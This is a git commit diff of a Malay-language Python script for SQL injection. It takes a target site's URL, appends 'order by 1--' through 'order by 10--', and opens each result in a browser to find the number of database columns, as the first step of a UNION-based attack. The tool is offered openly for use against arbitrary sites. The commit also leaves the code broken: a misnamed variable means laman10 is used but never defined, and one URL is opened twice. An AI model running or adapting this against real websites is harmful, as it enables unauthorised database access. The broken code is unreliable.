fe905e7e16c9cfeca5b2f046191ccc2c327975f5
Lina <linamikhail@users.noreply.github.com>
2020-06-01 15:45:00 +0800

    Update Python3 InjekUnion_10.py

--- Python3 InjekUnion_10.py
+++ Python3 InjekUnion_10.py
@@ -1,5 +1,7 @@
-# Skrip UlarSawa3 Suntikan SQL (SQLi) | # Tanya alamat laman web dam menjalankan injeksi / suntikan SQL keatas nya.
+# Skrip UlarSawa3 Suntikan SQL (SQLi) | Tanya alamat laman web dam menjalankan injeksi / suntikan SQL keatas nya.
 # Written by Lina M / ditulis oleh Lina M. | Mei 2020
+
+#Kod ni akan dikemaskinikan lagi tapi sebab aku tengah sibuk, jadi bersabarlah ye ...
 
 import random
 import string
@@ -8,53 +10,55 @@ import webbrowser
 print ("Selamat menggunakan Skrip UlarSawa3 Suntikan SQL (SQLi) kami.")
 print ("LANGKAH: 1")
 print ("Masukkan alamat sasaran secara penuh, contoh www.sasaran.com/index.php?=1")
-url0 = input("[+] Alamat sasaran: ")
+laman0 = input("[+] Alamat sasaran: ")
     
-union1 = str(1)
-union2 = str(2)
-union3 = str(3)
-union4 = str(4)
-union5 = str(5)
-union6 = str(6)
-union7 = str(7)
-union8 = str(8)
-union9 = str(9)
-union10 = str(10)
+kesatuan1 = str(1)
+kesatuan2 = str(2)
+kesatuan3 = str(3)
+kesatuan4 = str(4)
+kesatuan5 = str(5)
+kesatuan6 = str(6)
+kesatuan7 = str(7)
+kesatuan8 = str(8)
+kesatuan9 = str(9)
+kesatuan10 = str(10)
     
-url1 = (url0) + ' ' + 'order by '+ union1 + '--' 
-url2 = (url0) + ' ' + 'order by '+ union2 + '--'
-url3 = (url0) + ' ' + 'order by '+ union3 + '--'
-url4 = (url0) + ' ' + 'order by '+ union4 + '--'
-url5 = (url0) + ' ' + 'order by '+ union5 + '--'
-url6 = (url0) + ' ' + 'order by '+ union6 + '--'
-url7 = (url0) + ' ' + 'order by '+ union7 + '--' 
-url8 = (url0) + ' ' + 'order by '+ union8 + '--'
-url9 = (url0) + ' ' + 'order by '+ union9 + '--'
-url10 = (url0) + ' ' + 'order by '+ union10 + '--'
+laman1 = (laman0) + ' ' + 'order by '+ kesatuan1 + '--' 
+laman2 = (laman0) + ' ' + 'order by '+ kesatuan2 + '--'
+laman3 = (laman0) + ' ' + 'order by '+ kesatuan3 + '--'
+laman4 = (laman0) + ' ' + 'order by '+ kesatuan4 + '--'
+laman5 = (laman0) + ' ' + 'order by '+ kesatuan5 + '--'
+laman6 = (laman0) + ' ' + 'order by '+ kesatuan6 + '--'
+laman7 = (laman0) + ' ' + 'order by '+ kesatuan7 + '--' 
+laman8 = (laman0) + ' ' + 'order by '+ kesatuan8 + '--'
+laman9 = (laman0) + ' ' + 'order by '+ kesatuan9 + '--'
+laman0 = (laman0) + ' ' + 'order by '+ kesatuan10 + '--'
 
-print (url0)
-print (url1)
-print (url2)
-print (url3)
-print (url4)
-print (url5)
-print (url6)
-print (url7)
-print (url8)
-print (url9)
-print (url10)
+print (laman0)
+print (laman1)
+print (laman2)
+print (laman3)
+print (laman4)
+print (laman5)
+print (laman6)
+print (laman7)
+print (laman8)
+print (laman9)
+print (laman10)
 
 print ("Browser akan dibuka sekarang. Kenalpasti web page mana yang mempunyai mesej ralat X.")
 print ("Bilangan tiang atau column adalah -1 daripada X atau tiang iaitu X - 1.")
 
-webbrowser.open_new(url1)
-webbrowser.open_new(url2)
-webbrowser.open_new(url3)
-webbrowser.open_new(url4)
-webbrowser.open_new(url5)
-webbrowser.open_new(url6)
-webbrowser.open_new(url7)
-webbrowser.open_new(url7)
-webbrowser.open_new(url8)
-webbrowser.open_new(url9)
-webbrowser.open_new(url10)
+webbrowser.open_new(laman1)
+webbrowser.open_new(laman2)
+webbrowser.open_new(laman3)
+webbrowser.open_new(laman4)
+webbrowser.open_new(laman5)
+webbrowser.open_new(laman6)
+webbrowser.open_new(laman7)
+webbrowser.open_new(laman7)
+webbrowser.open_new(laman8)
+webbrowser.open_new(laman9)
+webbrowser.open_new(laman10)
+
+# LANGKAH 2 akan diberikan pada masa akan datang ...
